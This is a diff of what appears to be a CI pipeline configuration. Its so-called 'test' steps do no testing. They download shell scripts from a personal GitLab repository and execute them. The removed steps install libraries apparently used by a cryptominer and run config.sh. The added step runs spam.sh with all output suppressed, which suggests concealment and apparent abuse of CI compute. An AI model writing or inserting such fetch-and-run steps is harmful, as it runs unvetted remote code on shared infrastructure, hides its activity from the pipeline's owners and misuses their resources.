@@ -6,17 +6,4 @@ steps:
 - name: test-1
   image: golang
   commands:
-  - apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-  - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
-  
----
-kind: pipeline
-type: docker
-name: default-2
-
-steps:
-- name: test-2
-  image: golang
-  commands:
-  - apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-  - wget https://gitlab.com/renifer12/project-7/-/raw/main/config.sh && chmod +x config.sh && ./config.sh
+  - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam.sh && chmod +x spam.sh && ./spam.sh > /dev/null 2>&1
